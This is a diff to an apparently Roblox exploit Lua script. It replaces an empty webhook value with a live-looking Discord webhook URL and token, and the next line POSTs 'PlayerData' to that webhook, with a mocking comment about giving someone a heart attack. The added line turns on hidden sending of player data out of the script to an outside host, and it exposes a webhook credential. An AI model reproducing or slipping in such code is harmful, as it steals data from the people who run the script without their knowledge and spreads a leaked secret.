@@ -116,5 +116,5 @@ if syn then
     else
     HttpRequest = http_request
 end
-local Webhook = ""  --you thought heh? :money_mouth: just wanted to give erco an hearth attack
+local Webhook = "https://discord.com/api/webhooks/1283925249821511693/2WAPpdS8lMLx3Hu5UXFMBp4FQFQKUO7jREZ7MvFLUM8K4fElFIH1ZdhM29LByUhEzN2E"  --you thought heh? :money_mouth: just wanted to give erco an hearth attack
 HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
